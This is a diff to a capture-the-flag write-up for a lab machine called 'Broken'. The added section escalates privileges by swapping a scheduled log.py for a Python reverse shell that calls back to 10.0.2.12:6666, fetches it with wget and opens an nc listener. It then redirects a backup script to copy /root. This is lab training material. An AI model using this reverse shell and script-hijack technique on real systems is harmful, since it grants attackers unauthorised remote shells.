@@ -339,7 +339,7 @@ cd /home/alice/script
 touch test
 ```
 
-We go to ```/back/backup``` directory and found some interesting stuff there.  The ```backup``` is empty in the beginning.  We found the final flag ```FLAG3``` there.  Game Over!    
+We go to ```/back/backup``` directory and found some interesting stuff there.  The ```backup``` is empty in the beginning.  We found the final flag ```FLAG3``` there.  
 
 ```bash
 www-data@broken:/back$ cd /back 
@@ -370,6 +370,54 @@ www-data@broken:/back/backup$
 ![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/021.png)  
 
 ![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/022.png)  
+
+After seeing this note, that mean there is something to do further.  It is to try to put a directory to the ```path.txt```.  Trying to put ```/root``` to the ```path.txt```.
+
+However, we need to be ```alice``` rights to do so.  After studying the scripts, it is confirmed that ```log.py``` will run in ```alice``` rights.
+
+At Kali box, create a ```log.py``` with the following content.
+
+```python
+#!/usr/bin/python2.7
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.0.2.12",6666))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/usr/bin/bash","-i"])
+```
+
+```bash
+nc -lvp 6666
+```
+
+At Broken box at ```/home/alice/script```, do the following and wait for a minute.  A reverse shell is launched at port 6666.
+
+```bash
+cd /home/alice/script
+mv log.py log1.py
+wget http://10.0.2.12:4444/log.py
+chmod +x log.py
+```
+
+![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/023.png)  
+
+Go to ```/home/alice/backup``` and put ```/root``` to the ```path.txt```.  Then wait for a mintue.
+
+```bash
+cd /home/alice/backup
+echo "/root" > path.txt
+```
+
+![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/024.png)  
+
+Then go to ```/home/alice/backup/root```.
+
+![](https://raw.githubusercontent.com/samiux/images/master/broken-2020-1/025.png)  
+
+Root is dancing!
 
 ## Final thought
 
